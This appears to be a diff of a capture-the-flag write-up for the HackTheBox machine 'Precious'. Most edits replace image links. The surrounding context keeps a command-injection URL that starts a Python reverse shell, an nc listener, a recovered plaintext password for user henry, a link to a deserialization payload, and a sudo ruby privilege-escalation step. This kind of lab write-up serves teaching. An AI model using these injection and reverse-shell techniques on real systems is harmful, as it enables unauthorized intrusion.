@@ -55,19 +55,21 @@ So Let’s first enumerate port 80. The index page looks like this. Page source 
 
 
 
+![error-1](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/2aa4ce2a-70b6-4270-9b26-2e5c55449e41)
 
                                                                          
 
 The web server appears to offer a service that converts web pages into PDF files. Let’s test this functionality out.
 
-![1_rQGaBrXKGZtnBwTeLP5tZg.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008582533/4b8b101e-f65a-451c-94c7-087c81493802.webp?auto=compress,format&format=webp)
+
 
 ```sh
 python3 -m http.server --bind 127.0.0.1 80
 ```
 Once your server is running, go back to precious.htb and enter the IP address and port number your server is running on, and click submit. As expected, a pdf file should be downloaded to your machine. Mine looks like this:
 
-![1_7Q3i6kaKvTVB2OKarJqyww.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008594683/5db20699-5474-4b4b-a669-755ffc2b6ec6.webp?auto=compress,format&format=webp)
+![error2](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/08b7444b-6967-4698-831f-33aab3c20a96)
+
 
 ####   Let's check the metadata of this!!
 ```
@@ -106,7 +108,8 @@ http://xx.xx.xx.xx/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.so
 nc -lnvp 9001
 ```
 
-![1_eKwh6KNdXAW8NTLaMU-TZA.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008670007/93dff2e1-b8e9-4ff7-9836-1f5b6d50b9e8.webp?auto=compress,format&format=webp)
+![error-3](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/6c014a2f-f86a-4c20-aed2-1cc83497dccd)
+
 
 Looking around a bit more, we find a file in /home/ruby/.bundle directory called config. Displaying the contents of config reveals the password for user henry
 
@@ -115,8 +118,9 @@ Looking around a bit more, we find a file in /home/ruby/.bundle directory called
 As you can see, we managed to log into the server as the user ruby. Navigating to the /home directory, we find two directories. One for our ruby user, and one for a user called henry. Inside henry’s directory we can see a file called user.txt. That’s got to be our first flag. Unfortunately, we can’t access it yet
 
 
+![4](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/319140e1-0bf1-43d8-b213-450f1ccaf701)
 
-![1_T9L8TuHDBNYhsugJctzCoA.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008738144/e4710698-d59a-4b61-9153-c8edfb8d4f73.webp?auto=compress,format&format=webp)
+
 
 instead we got password for henry's account ```Q3c1AqGHtoI0aXAYFH```
 
@@ -126,11 +130,13 @@ ssh henry@<ip-addr>
 
 ## Privilege Escalation:
 
-![1_Lw_aaW0-w4GS1g0MSqtZwg.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008817753/c0b8f3f5-b688-4c8d-8773-f6e8bf40d31e.webp?auto=compress,format&format=webp)
+![5](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/89b02b5e-c4aa-4397-a057-f566c6e2e647)
+
 
 It appears that henry can run the file update_depencies.rb **as root**. Use cat to take a look at the file
 
-![1_q5yGqzQ3IUSLAvZ4H2TL9Q.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008831300/5446402e-3683-4097-9ddc-95261d086fbb.webp?auto=compress,format&format=webp)
+![6](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/e0dbfef5-4180-4775-928e-b8d6bd400ac4)
+
 
 [click here to copy the payload](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565)
 ```
@@ -162,7 +168,8 @@ Run the file
 ```sh
 sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
-![1__MagsGJeINwnESjf6izVUw.webp](https://cdn.hashnode.com/res/hashnode/image/upload/v1670008869699/1561e141-d42b-4bcb-b571-1d08c7ef21f3.webp?auto=compress,format&format=webp)
+![8](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/ab288969-6c69-4b6e-a05d-7f4da2bcef4a)
+
 
 &nbsp;
 &nbsp;
